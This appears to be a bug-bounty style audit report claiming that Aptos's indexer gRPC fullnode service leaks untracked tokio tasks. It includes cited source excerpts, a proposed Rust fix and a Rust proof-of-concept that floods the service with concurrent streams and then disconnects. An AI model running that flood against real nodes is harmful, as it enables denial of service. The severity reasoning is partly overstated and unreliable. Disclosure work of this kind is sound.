# Audit Report

## Title
Resource Leak via Untracked Background Tasks in Indexer gRPC Fullnode Service

## Summary
The `FullnodeDataService` Drop implementation fails to clean up spawned tokio tasks and channels, allowing resource exhaustion through unbounded task accumulation. Multiple concurrent gRPC streams spawn tasks that continue running even after the service or client connections are terminated.

## Finding Description

The `FullnodeDataService` struct contains an `abort_handle` field intended for graceful shutdown coordination, but the Drop implementation only prints a debug message without signaling spawned tasks to stop or waiting for their completion. [1](#0-0) 

Each call to `get_transactions_from_node` spawns a long-running tokio task without tracking its join handle. This task creates an `IndexerStreamCoordinator` and processes transactions in a loop: [2](#0-1) 

The spawned task checks `abort_handle` periodically but this flag is never set to true when the service is dropped: [3](#0-2) 

Additionally, `IndexerStreamCoordinator` spawns multiple additional tasks during transaction processing: [4](#0-3) [5](#0-4) 

In contrast, other indexer components properly track and clean up tasks. The cache worker demonstrates the correct pattern by maintaining a `tasks_to_run` vector, using `join_all()` to wait for completion, and explicitly cleaning up: [6](#0-5) [7](#0-6) 

**Attack Path:**
1. Attacker opens multiple concurrent gRPC connections to `get_transactions_from_node`
2. Each connection spawns untracked tasks (main coordinator + multiple processor/fetcher tasks)
3. Attacker requests large version ranges or rapidly disconnects
4. Tasks continue running, holding references to `Arc<Context>` (database handles, resources)
5. With sufficient concurrent connections, this exhausts server resources (CPU, memory, file handles)
6. No join handles exist to await task completion; no cleanup occurs on service Drop

This breaks **Invariant #9: Resource Limits** - "All operations must respect gas, storage, and computational limits."

## Impact Explanation

**Medium Severity** - This vulnerability enables Denial of Service through resource exhaustion of the indexer gRPC API service. While it doesn't directly affect blockchain consensus or state integrity, it impacts data availability for external indexers and monitoring systems. The service could experience:

- Memory exhaustion from accumulated task state
- CPU starvation from competing tasks
- Database connection pool exhaustion
- Inability to process legitimate indexer requests

Per Aptos bug bounty criteria, this qualifies as Medium severity: "State inconsistencies requiring intervention" (requiring service restart to recover) and potentially approaches High severity for "API crashes."

## Likelihood Explanation

**High Likelihood** - This vulnerability is easily exploitable by any network peer with gRPC access. No special privileges or authentication bypasses are required. The attacker only needs to:
1. Open multiple concurrent connections (no rate limits detected in code)
2. Request transaction streams with large version ranges
3. Optionally disconnect rapidly to maximize task accumulation

The attack requires minimal resources from the attacker while consuming significant resources on the target server. No rate limiting or connection throttling mechanisms were found in the codebase to mitigate this attack vector.

## Recommendation

Implement proper resource cleanup in the Drop trait:

1. **Track spawned tasks** - Store join handles in the struct
2. **Signal graceful shutdown** - Set abort_handle to true in Drop
3. **Wait for completion** - Await all tracked tasks
4. **Close channels** - Explicitly drop sender/receiver handles

**Recommended fix:**

```rust
pub struct FullnodeDataService {
    pub service_context: ServiceContext,
    pub abort_handle: Arc<AtomicBool>,
    task_handles: Arc<Mutex<Vec<tokio::task::JoinHandle<()>>>>,
}

impl Drop for FullnodeDataService {
    fn drop(&mut self) {
        println!("**** Dropping FullnodeDataService - initiating cleanup ****");
        
        // Signal all tasks to abort
        self.abort_handle.store(true, Ordering::SeqCst);
        
        // Wait for tasks with timeout
        let handles = std::mem::take(&mut *self.task_handles.lock().unwrap());
        let runtime = tokio::runtime::Handle::try_current();
        if let Ok(rt) = runtime {
            rt.block_on(async {
                let timeout = tokio::time::timeout(
                    Duration::from_secs(5),
                    futures::future::join_all(handles)
                ).await;
                if timeout.is_err() {
                    eprintln!("Warning: Task cleanup timed out");
                }
            });
        }
    }
}
```

And track the spawned task:

```rust
let task_handles = self.task_handles.clone();
let handle = tokio::spawn(async move {
    // ... existing coordinator logic ...
});
task_handles.lock().unwrap().push(handle);
```

## Proof of Concept

```rust
// Proof of Concept: Resource exhaustion through rapid connections
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient, GetTransactionsFromNodeRequest,
};
use futures::StreamExt;
use std::time::Duration;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let grpc_endpoint = "http://localhost:50051"; // Target indexer-grpc service
    
    // Spawn 100 concurrent connections
    let mut tasks = vec![];
    for i in 0..100 {
        let endpoint = grpc_endpoint.to_string();
        let task = tokio::spawn(async move {
            let mut client = FullnodeDataClient::connect(endpoint).await.unwrap();
            
            // Request large version range
            let request = GetTransactionsFromNodeRequest {
                starting_version: Some(i * 1_000_000),
                transactions_count: Some(10_000_000), // 10M transactions
            };
            
            let mut stream = client
                .get_transactions_from_node(request)
                .await
                .unwrap()
                .into_inner();
            
            // Receive a few responses then disconnect abruptly
            for _ in 0..5 {
                if stream.next().await.is_none() {
                    break;
                }
            }
            // Drop stream - connection closes but server tasks continue
            drop(stream);
        });
        tasks.push(task);
        
        // Small delay to avoid overwhelming connection establishment
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    
    // Wait for all attack tasks
    futures::future::join_all(tasks).await;
    
    println!("Attack complete - server now has 100+ untracked background tasks");
    println!("Each spawned multiple processor/fetcher tasks holding resources");
    println!("Tasks will continue until version ranges complete or server crashes");
    
    Ok(())
}
```

**Notes:**
- This vulnerability affects the indexer-grpc-fullnode data service, not core consensus components
- Resource exhaustion is limited to nodes running the indexer-grpc service with `config.indexer_grpc.enabled = true`
- The attack does not affect blockchain state, consensus, or fund security
- Similar patterns exist in other Aptos components but this specific service lacks proper cleanup
- The abort_handle mechanism exists but is never activated during Drop, rendering it ineffective for cleanup

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L41-45)
```rust
impl Drop for FullnodeDataService {
    fn drop(&mut self) {
        println!("**** Dropping FullnodeDataService. ****");
    }
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L101-200)
```rust
        tokio::spawn(async move {
            // Initialize the coordinator that tracks starting version and processes transactions
            let mut coordinator = IndexerStreamCoordinator::new(
                context,
                starting_version,
                ending_version,
                processor_task_count,
                processor_batch_size,
                output_batch_size,
                tx.clone(),
                // For now the request for this interface doesn't include a txn filter
                // because it is only used for the txn stream filestore worker, which
                // needs every transaction. Later we may add support for txn filtering
                // to this interface too.
                None,
                Some(abort_handle.clone()),
            );
            // Sends init message (one time per request) to the client in the with chain id and starting version. Basically a handshake
            let init_status = get_status(StatusType::Init, starting_version, None, ledger_chain_id);
            match tx.send(Result::<_, Status>::Ok(init_status)).await {
                Ok(_) => {
                    // TODO: Add request details later
                    info!(
                        start_version = starting_version,
                        chain_id = ledger_chain_id,
                        service_type = SERVICE_TYPE,
                        "[Indexer Fullnode] Init connection"
                    );
                },
                Err(_) => {
                    panic!("[Indexer Fullnode] Unable to initialize stream");
                },
            }
            let mut base: u64 = 0;
            while coordinator.current_version < coordinator.end_version {
                let start_time = std::time::Instant::now();
                // Processes and sends batch of transactions to client
                let results = coordinator.process_next_batch().await;
                if abort_handle.load(Ordering::SeqCst) {
                    info!("FullnodeDataService is aborted.");
                    break;
                }
                if results.is_empty() {
                    info!(
                        start_version = starting_version,
                        chain_id = ledger_chain_id,
                        "[Indexer Fullnode] Client disconnected."
                    );
                    break;
                }
                let max_version = match IndexerStreamCoordinator::get_max_batch_version(results) {
                    Ok(max_version) => max_version,
                    Err(e) => {
                        error!("[Indexer Fullnode] Error sending to stream: {}", e);
                        break;
                    },
                };
                let highest_known_version = coordinator.highest_known_version;

                // send end batch message (each batch) upon success of the entire batch
                // client can use the start and end version to ensure that there are no gaps
                // end loop if this message fails to send because otherwise the client can't validate
                let batch_end_status = get_status(
                    StatusType::BatchEnd,
                    coordinator.current_version,
                    Some(max_version),
                    ledger_chain_id,
                );
                let channel_size = transaction_channel_size - tx.capacity();
                CHANNEL_SIZE
                    .with_label_values(&["2"])
                    .set(channel_size as i64);
                match tx.send(Result::<_, Status>::Ok(batch_end_status)).await {
                    Ok(_) => {
                        // tps logging
                        let new_base: u64 = ma.sum() / (DEFAULT_EMIT_SIZE as u64);
                        ma.tick_now(max_version - coordinator.current_version + 1);
                        if base != new_base {
                            base = new_base;

                            log_grpc_step_fullnode(
                                IndexerGrpcStep::FullnodeProcessedBatch,
                                Some(coordinator.current_version as i64),
                                Some(max_version as i64),
                                None,
                                Some(highest_known_version as i64),
                                Some(ma.avg() * 1000.0),
                                Some(start_time.elapsed().as_secs_f64()),
                                Some((max_version - coordinator.current_version + 1) as i64),
                            );
                        }
                    },
                    Err(_) => {
                        aptos_logger::warn!("[Indexer Fullnode] Unable to send end batch status");
                        break;
                    },
                }
                coordinator.current_version = max_version + 1;
            }
        });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L170-200)
```rust
            let task = tokio::task::spawn_blocking(move || {
                let raw_txns = batch;
                let api_txns = Self::convert_to_api_txns(context, raw_txns);
                let pb_txns = Self::convert_to_pb_txns(api_txns);
                // Apply filter if present.
                let pb_txns = if let Some(ref filter) = filter {
                    pb_txns
                        .into_iter()
                        .filter(|txn| filter.matches(txn))
                        .collect::<Vec<_>>()
                } else {
                    pb_txns
                };
                let mut responses = vec![];
                // Wrap in stream response object and send to channel
                for chunk in pb_txns.chunks(output_batch_size as usize) {
                    for chunk in chunk_transactions(chunk.to_vec(), MESSAGE_SIZE_LIMIT) {
                        let item = TransactionsFromNodeResponse {
                            response: Some(transactions_from_node_response::Response::Data(
                                TransactionsOutput {
                                    transactions: chunk,
                                },
                            )),
                            chain_id: ledger_chain_id as u32,
                        };
                        responses.push(item);
                    }
                }
                responses
            });
            tasks.push(task);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L248-252)
```rust
            let task = tokio::spawn(async move {
                Self::fetch_raw_txns_with_retries(context.clone(), ledger_version, batch).await
            });
            storage_fetch_tasks.push(task);
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L354-354)
```rust
    let mut tasks_to_run = vec![];
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L418-432)
```rust
                    let result = join_all(tasks_to_run).await;
                    if result
                        .iter()
                        .any(|r| r.is_err() || r.as_ref().unwrap().is_err())
                    {
                        error!(
                            start_version = start_version,
                            num_of_transactions = num_of_transactions,
                            "[Indexer Cache] Process transactions from fullnode failed."
                        );
                        ERROR_COUNT.with_label_values(&["response_error"]).inc();
                        panic!("Error happens when processing transactions from fullnode.");
                    }
                    // Cleanup.
                    tasks_to_run = vec![];
```
